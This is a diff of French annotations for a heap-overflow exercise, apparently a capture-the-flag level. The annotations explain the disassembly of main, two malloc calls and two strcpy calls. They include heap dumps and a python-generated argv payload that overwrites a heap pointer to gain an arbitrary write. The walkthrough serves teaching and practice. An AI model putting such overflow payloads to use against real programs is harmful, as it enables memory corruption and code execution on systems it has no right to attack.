@@ -35,11 +35,11 @@ Dump of assembler code for function main:			|
    --------------------------------------------------------------	pattern. Le pattern se répète donc deux fois (a) & (b).
    0x0804852a <+9>:	movl   $0x8,(%esp)			|										
    0x08048531 <+16>:	call   0x80483f0 <malloc@plt>  (1a)	|											
-   0x08048536 <+21>:	mov    %eax,0x1c(%esp)         (2a)	|	(1) Allouer un malloc1() de size 8							
-   0x0804853a <+25>:	mov    0x1c(%esp),%eax	       		| 	(2) Stocker l'adresse de malloc1() -> X1 	(start) Debut de la heap							
+   0x08048536 <+21>:	mov    %eax,0x1c(%esp)         (2a)	|	(1) Allouer un premier malloc1() de size 8							
+   0x0804853a <+25>:	mov    0x1c(%esp),%eax	       		| 	(2) Stocker l'adresse de malloc1() -> X 	(start) Debut de la heap							
    0x0804853e <+29>:	movl   $0x1,(%eax)	       (3a)	|	(3) Ajoutez le rank   				(end) Fin de la heap		
-   0x08048544 <+35>:	movl   $0x8,(%esp)			|	(4) Allouer un malloc2() de size 8              				
-   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>  (4a)	|	(5) Stocker l'adresse de malloc2() -> X1 + 0x4					
+   0x08048544 <+35>:	movl   $0x8,(%esp)			|	(4) Allouer un deuxième malloc2() de size 8              				
+   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>  (4a)	|	(5) Stocker l'adresse de malloc2() -> X + 0x4					
    0x08048550 <+47>:	mov    %eax,%edx			|											
    0x08048552 <+49>:	mov    0x1c(%esp),%eax			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018	
    0x08048556 <+53>:	mov    %edx,0x4(%eax)	       (5a)	|			(start)				(1a)(3a)	(5a)		
@@ -57,19 +57,19 @@ Dump of assembler code for function main:			|
    0x08048588 <+103>:	mov    0xc(%ebp),%eax	      AV[0]	|	STRCPY PATTERN												OVERWRITE ATTEMPT
    0x0804858b <+106>:	add    $0x4,%eax    AV[0]+4 = AV[1]	|														
    0x0804858e <+109>:	mov    (%eax),%eax			|	(1) On récupère (a)l'argument AV[1] "AAAA" / (b)l'argument AV[2] "BBBB" 				On tente ici de réérire sur l'adressse du malloc2 avec une adresse de notre choix 0xbfffffff.
-   0x08048590 <+111>:	mov    %eax,%edx	       (1a)	|	(2) On récupère l'adresse du malloc2()									On récupère l'argument AV[1] = "$(python -c 'print( 20 * "A" + "\xff\xff\xff\xbf")')".  				   
-   0x08048592 <+113>:	mov    0x1c(%esp),%eax 			|	(3) On appelle strcpy() avec pour argument (1) et (2)							AV[1] overwrite toutes les adresses de jusqu'a celle du malloc2 et la remplace par celle souhaitée.
+   0x08048590 <+111>:	mov    %eax,%edx	       (1a)	|	(2) On récupère X + 0x4 (adresse du malloc2())								On récupère l'argument AV[1] = "$(python -c 'print( 20 * "A" + "\xff\xff\xff\xbf")')".  				   
+   0x08048592 <+113>:	mov    0x1c(%esp),%eax 			|	(3) On appelle (a)strcpy(X + 0x4, AV[1]) / (b)strcpy(X + 0x4, AV[2]) 					AV[1] overwrite toutes les adresses jusqu'a "X + 0x4(b)" et la remplace par celle souhaitée.
    0x08048596 <+117>:	mov    0x4(%eax),%eax  	       (2a)	|														AV[2] sera donc écris à l'adresse 0xbfffffff. Après tentative de réécriture:
    0x08048599 <+120>:	mov    %edx,0x4(%esp)			|	Heap après le premier pattern :										 
-   0x0804859d <+124>:	mov    %eax,(%esp)			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018 --> adresse malloc1		0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+   0x0804859d <+124>:	mov    %eax,(%esp)			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018 --> X + 0x4(a)		0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
    0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>  (3a)	|	0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000				0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
-   0x080485a5 <+132>:	mov    0xc(%ebp),%eax			|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 --> adresse malloc2		0x804a020:	0x41414141	0x41414141	0x41414141	0xbfffffff
+   0x080485a5 <+132>:	mov    0xc(%ebp),%eax			|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 				0x804a020:	0x41414141	0x41414141	0x41414141	0xbfffffff
    0x080485a8 <+135>:	add    $0x8,%eax    AV[0]+8 = AV[2]	|	0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000				0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
-   0x080485ab <+138>:	mov    (%eax),%eax			|														SUCCESS !!
+   0x080485ab <+138>:	mov    (%eax),%eax			|														
    0x080485ad <+140>:	mov    %eax,%edx	       (1b)	|	Heap après le second pattern :
-   0x080485af <+142>:	mov    0x18(%esp),%eax			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018 --> adresse malloc1 		Nous savons desormais que nous pouvons écrire dans une adresse de notre choix. 
+   0x080485af <+142>:	mov    0x18(%esp),%eax			|	0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018 		 		Nous savons desormais que nous pouvons écrire dans une adresse de notre choix. 
    0x080485b3 <+146>:	mov    0x4(%eax),%eax	       (2b)	|	0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000				Pour ce faire:
-   0x080485b6 <+149>:	mov    %edx,0x4(%esp)			|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 --> adresse malloc2		- AV[1] = OFFSET DE 20 + MYADDRESS
+   0x080485b6 <+149>:	mov    %edx,0x4(%esp)			|	0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038 --> X + 0x4(b)		- AV[1] = OFFSET DE 20 + MYADDRESS
    0x080485ba <+153>:	mov    %eax,(%esp)			|	0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000				- AV[2] -> MYADDRESS
    0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>  (3b)	|										   suite-->
    ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
